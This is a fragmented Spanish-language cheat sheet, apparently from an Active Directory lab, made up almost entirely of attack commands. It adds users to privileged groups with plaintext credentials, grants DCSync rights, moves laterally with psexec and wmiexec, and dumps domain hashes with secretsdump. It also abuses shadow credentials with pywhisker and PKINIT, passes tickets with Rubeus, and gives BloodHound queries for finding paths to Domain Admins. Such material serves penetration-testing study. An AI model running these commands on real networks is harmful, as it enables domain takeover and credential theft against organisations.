...
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\grace', $SecPassword)
...
# Desde Windows
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\rosy', (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force))
...
```c
psexec.py DOMAIN/sarah:Password12@<IP>
wmiexec.py DOMAIN/sarah:Password12@<IP>
...
```c
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\martha', (ConvertTo-SecureString 'Password13' -AsPlainText -Force))
Add-DomainGroupMember -Identity 'ITManagers' -Members 'user' -Credential $Cred -Verbose
...
```c
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\victor', (ConvertTo-SecureString 'Password14' -AsPlainText -Force))
...
```c
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\pedro', (ConvertTo-SecureString 'Password17' -AsPlainText -Force))
...
```c
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\pedro', (ConvertTo-SecureString 'Password17' -AsPlainText -Force))
Add-DomainGroupMember -Identity 'ITAdmins' -Members 'user' -Credential $Cred -Verbose
```
...
```c
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\carlos', (ConvertTo-SecureString 'Password18' -AsPlainText -Force))
...
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=DOMAIN,DC=local" -PrincipalIdentity carlos -Rights DCSync -Verbose
```
...
```c
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\indhi', (ConvertTo-SecureString 'Password20' -AsPlainText -Force))
...
```c
# Linux
secretsdump.py DOMAIN/peter:Licey2023@<DC IP>

# Solo el Administrator
secretsdump.py -just-dc-user DOMAIN/administrator DOMAIN/peter:Licey2023@<DC IP>
...
```c
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\cherly', (ConvertTo-SecureString 'Password24' -AsPlainText -Force))
...
python3 pywhisker.py -d DOMAIN.local -u sarah -p Password12 --target indhi --action add

# Usar el certificado generado para pedir TGT de indhi
python3 gettgtpkinit.py DOMAIN.local/indhi -pfx-base64 <base64> indhi.ccache
export KRB5CCNAME=indhi.ccache

# Con el TGT de indhi hacer DCSync o lo que sea
secretsdump.py -k -no-pass DOMAIN.local/indhi@<DC>
```
...
.\Rubeus.exe asktgt /user:ester /password:Password15 /domain:DOMAIN.local /ptt
...
```
Pathfinding:
Origen: DOMAIN USERS@DOMAIN.local
Destino: DOMAIN ADMINS@DOMAIN.local
```
...
MATCH (u:User {name:"PETER@DOMAIN.local"}) RETURN u

# Usuario específico con WHERE
MATCH (u:User) WHERE u.name = "PETER@DOMAIN.local" RETURN u

# Grupos a los que pertenece Peter
MATCH (u:User {name:"PETER@DOMAIN.local"})-[r:MemberOf]->(peterGroups)
RETURN peterGroups

# Mostrar el grafo completo de la relación
MATCH p=((n:User {name:"PETER@DOMAIN.local"})-[r:MemberOf]->(g:Group))
RETURN p
```
...
MATCH p=((u:User {name:"PETER@DOMAIN.local"})-[r:MemberOf*1..]->(g:Group))
RETURN p
...
```c
MATCH p=((n:User {name:"SARAH@DOMAIN.local"})-[r]->(m))
RETURN p
```
...
```c
MATCH (n)-[r]->(u:User {name:"NICOLE@DOMAIN.local"})
...
```c
MATCH (g:Group {name:"DOMAIN ADMINS@DOMAIN.local"})-[:HasSession]->(c:Computer)
RETURN c.name
```
